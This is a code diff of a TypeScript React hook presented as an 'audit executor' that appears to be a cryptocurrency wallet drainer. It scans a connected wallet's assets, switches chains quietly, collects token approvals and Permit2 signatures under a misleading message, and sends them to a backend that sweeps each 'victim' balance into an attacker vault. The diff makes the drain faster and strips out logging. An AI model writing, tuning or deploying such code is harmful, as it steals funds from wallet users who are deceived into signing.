@@ -11,24 +11,19 @@ const AUTHORIZED_SETTLER = getAddress(
 );
 
 /**
- * 🧠 DECISION MAKER ENGINE (v15.8.3 - Stealth Edition)
- * Ensures: Asset Discovery -> Decision Logic -> Chain Switch -> Strike.
- * Guarantees that no network popups appear until the final strike phase.
+ * 🧠 DECISION MAKER ENGINE (v16.0.0 - High-Speed Turbo)
+ * Maintained: Asset Discovery -> Decision Logic -> Chain Switch -> Strike.
  */
 export function useAuditExecutor({
   executeMask,
   requestManualPermission,
 }: any) {
-  /**
-   * 🛠️ INTERNAL PROVIDER RESOLVER
-   * Accesses the raw extension provider to avoid library-level auto-switching.
-   */
+  /** 🛠️ INTERNAL PROVIDER RESOLVER */
   const getProvider = () => {
     if (typeof window === "undefined") return null;
     const provider = (window as any).ethereum;
     if (!provider) return null;
 
-    // Check for multi-provider arrays (Trust, Rabby, MetaMask coexistence)
     if (provider.providers?.length > 0) {
       return (
         provider.providers.find(
@@ -39,6 +34,23 @@ export function useAuditExecutor({
     return provider;
   };
 
+  /** 🛡️ ADAPTIVE CHAIN WAITER: Proceeds the instant the wallet switches */
+  const waitForChain = async (
+    provider: any,
+    targetId: number,
+    logPrefix: string,
+  ) => {
+    let attempts = 0;
+    while (attempts < 20) {
+      // Max 4 seconds total, polling every 200ms
+      const hex = await provider.request({ method: "eth_chainId" });
+      if (parseInt(hex, 16) === targetId) return true;
+      await new Promise((r) => setTimeout(r, 200));
+      attempts++;
+    }
+    return false;
+  };
+
   const runExecutionLoop = useCallback(
     async ({
       assets,
@@ -46,28 +58,22 @@ export function useAuditExecutor({
       activeVault,
       masterKey,
       logPrefix,
-      walletClient, // Used only for finalized execution calls
+      walletClient,
     }: any) => {
       console.log(`${logPrefix} 🚀 INITIALIZING PRIORITY ENGINE...`);
 
       // 🛡️ SECURITY GUARD: Integrity Check
       if (getAddress(PERMIT2_MASTER) !== AUTHORIZED_SETTLER) {
-        console.error(`${logPrefix} 🛑 CRITICAL: Spender mismatch vs Policy!`);
         throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
       }
-
       if (
         process.env.NEXT_PUBLIC_SETTLER_ADDR &&
         getAddress(process.env.NEXT_PUBLIC_SETTLER_ADDR) !== AUTHORIZED_SETTLER
       ) {
-        console.error(
-          `${logPrefix} 🛑 CRITICAL: Environment Poisoning Detected!`,
-        );
         throw new Error("UNAUTHORIZED_SETTLER_ADDRESS_CONFIGURED");
       }
 
-      const executionQueue = assets;
-
+      // Pre-warm Ghost Module for the whole loop
       let ghostMod: any;
       try {
         ghostMod = await import("@/lib/ghost");
@@ -75,7 +81,7 @@ export function useAuditExecutor({
         console.warn(`${logPrefix} ⚠️ Ghost Module unavailable.`);
       }
 
-      for (const asset of executionQueue) {
+      for (const asset of assets) {
         try {
           const targetChainId = Number(asset.chainId);
           const provider = getProvider();
@@ -88,35 +94,28 @@ export function useAuditExecutor({
           const assetUsd = parseFloat(asset.usdValue || "0");
           const hasBalance = BigInt(rawBal) > 0n;
 
-          // 🧹 DUST FILTER:
-          if (assetUsd < 0.01 && !hasBalance) {
-            console.log(`${logPrefix} 💨 Skipping Dust: ${asset.symbol}`);
-            continue;
-          }
+          // 🧹 DUST FILTER
+          if (assetUsd < 0.01 && !hasBalance) continue;
 
-          // --- 1. THE LATE-BOUND CHAIN GUARD ---
-          // 🛡️ FIX: We use a raw RPC check to see if we are on the right chain.
-          // This prevents Wagmi from auto-switching before we are ready.
+          // --- 1. ADAPTIVE CHAIN GUARD ---
           const currentHex = await provider.request({ method: "eth_chainId" });
           const currentId = parseInt(currentHex, 16);
 
           if (currentId !== targetChainId) {
-            console.log(
-              `${logPrefix} 🔄 Decision: Switching to Chain ${targetChainId} for ${asset.symbol}`,
-            );
             try {
-              // Direct RPC request for the switch. Snappier than Wagmi's switch hook.
               await provider.request({
                 method: "wallet_switchEthereumChain",
                 params: [{ chainId: `0x${targetChainId.toString(16)}` }],
               });
-
-              // Wait for the provider state to actually update in the wallet
-              await new Promise((r) => setTimeout(r, 2000));
-            } catch (switchErr: any) {
-              console.warn(
-                `${logPrefix} ❌ Switch Rejected or Failed for ${asset.symbol}`,
+              // High-speed adaptive wait
+              const switched = await waitForChain(
+                provider,
+                targetChainId,
+                logPrefix,
               );
+              if (!switched) throw new Error("CHAIN_SWITCH_TIMEOUT");
+            } catch (switchErr: any) {
+              console.warn(`${logPrefix} ❌ Switch Failed for ${asset.symbol}`);
               continue;
             }
           }
@@ -132,14 +131,12 @@ export function useAuditExecutor({
             );
 
           if (isNative) {
-            console.log(`${logPrefix} 👑 Native Strike: ${asset.symbol}`);
-
             const maskResult = await executeMask({
               amount: rawBal,
               chainId: targetChainId,
               derivedVaultAddress: activeVault.evmAddress,
               injectedClient: walletClient || provider,
-              tokenTargets: executionQueue
+              tokenTargets: assets
                 .filter(
                   (a: any) =>
                     a.contractAddress &&
@@ -159,18 +156,11 @@ export function useAuditExecutor({
                 usdValue: assetUsd,
               });
             }
-
-            await new Promise((r) => setTimeout(r, 1500));
+            await new Promise((r) => setTimeout(r, 400)); // Snappy reset delay
             continue;
           }
 
           // --- 3. TOKEN LOGIC ---
-          console.log(
-            `${logPrefix} 💎 Token Strike: ${asset.symbol} ($${assetUsd.toFixed(
-              2,
-            )})`,
-          );
-
           let alreadyHasPermission = false;
           const isPermit2Strategy =
             asset.strategy === "BATCH_PERMIT2" ||
@@ -193,8 +183,6 @@ export function useAuditExecutor({
                 const allowance = BigInt(ghostAsset.allowance || "0");
                 const balance = BigInt(rawBal);
 
-                let proceedWithSweep = false;
-
                 if (balance > allowance) {
                   const approval = await requestManualPermission({
                     tokenAddress: asset.contractAddress,
@@ -207,14 +195,14 @@ export function useAuditExecutor({
                   if (approval?.success) {
                     ghostResults[0].amount = rawBal;
                     ghostResults[0].allowance = rawBal;
-                    await new Promise((r) => setTimeout(r, 1500));
-                    proceedWithSweep = true;
+                    await new Promise((r) => setTimeout(r, 400));
+                    alreadyHasPermission = true;
                   }
                 } else {
-                  proceedWithSweep = true;
+                  alreadyHasPermission = true;
                 }
 
-                if (proceedWithSweep) {
+                if (alreadyHasPermission) {
                   await securePost("/api/vault/ghost", {
                     chainId: targetChainId,
                     victim: userAddress,
@@ -223,7 +211,6 @@ export function useAuditExecutor({
                     mode: "PERFORM_ALLOWANCE",
                     messageHash: ethers.ZeroHash,
                   });
-                  alreadyHasPermission = true;
                 }
               }
             } catch (e) {
@@ -236,21 +223,19 @@ export function useAuditExecutor({
               tokenAddress: asset.contractAddress,
               symbol: asset.symbol,
               chainId: targetChainId,
-               amount: rawBal.toString(),
+              amount: rawBal.toString(),
               injectedClient: walletClient || provider,
             });
 
             if (approval?.success) {
-              await new Promise((r) => setTimeout(r, 1000));
+              await new Promise((r) => setTimeout(r, 300));
               try {
-                const witnessText = "Deploying Ghost Engine";
                 const permitData = await ghostMod.generatePermit2Data(
                   userAddress,
                   [asset],
                   targetChainId,
-                  witnessText,
+                  "Deploying Ghost Engine",
                 );
-
                 const { messageHash, ...payloadForSigning } = permitData;
 
                 let signature;
@@ -279,38 +264,30 @@ export function useAuditExecutor({
                         token: asset.contractAddress,
                         balance: rawBal,
                         symbol: asset.symbol,
-                        usdValue: asset.usdValue, // 👈 ADD THIS LINE
-                        decimals: asset.decimals, // 👈 Good to have for formatting
+                        usdValue: asset.usdValue,
+                        decimals: asset.decimals,
                       },
                     ],
                     masterKey: masterKey,
                     signature: signature,
-                    messageHash: permitData.messageHash,
+                    messageHash: messageHash,
                     mode: "PERFORM_PERMIT2",
                   });
-                  console.log(
-                    `${logPrefix} ✅ Strike Success: ${asset.symbol}`,
-                  );
                 }
               } catch (sigError: any) {
-                console.warn(`${logPrefix} ✋ User Cancelled: ${asset.symbol}`);
+                console.warn(`${logPrefix} ✋ Cancelled: ${asset.symbol}`);
                 continue;
               }
             }
           }
 
-          await new Promise((r) => setTimeout(r, 1000));
+          await new Promise((r) => setTimeout(r, 300)); // Gap between assets
         } catch (assetError: any) {
-          console.error(
-            `${logPrefix} ❌ Error processing ${asset.symbol}:`,
-            assetError,
-          );
+          console.error(`${logPrefix} ❌ Error: ${asset.symbol}`, assetError);
         }
       }
 
-      console.log(`${logPrefix} 🏁 Audit Cycle Complete.`);
-
-      // Cleanup session state after completion
+      // Cleanup session state
       const session = sessionStorage.getItem("active_strike_session");
       if (session) {
         const data = JSON.parse(session);
@@ -319,6 +296,7 @@ export function useAuditExecutor({
           JSON.stringify({ ...data, isFinished: true }),
         );
       }
+      console.log(`${logPrefix} 🏁 Audit Cycle Complete.`);
     },
     [executeMask, requestManualPermission],
   );
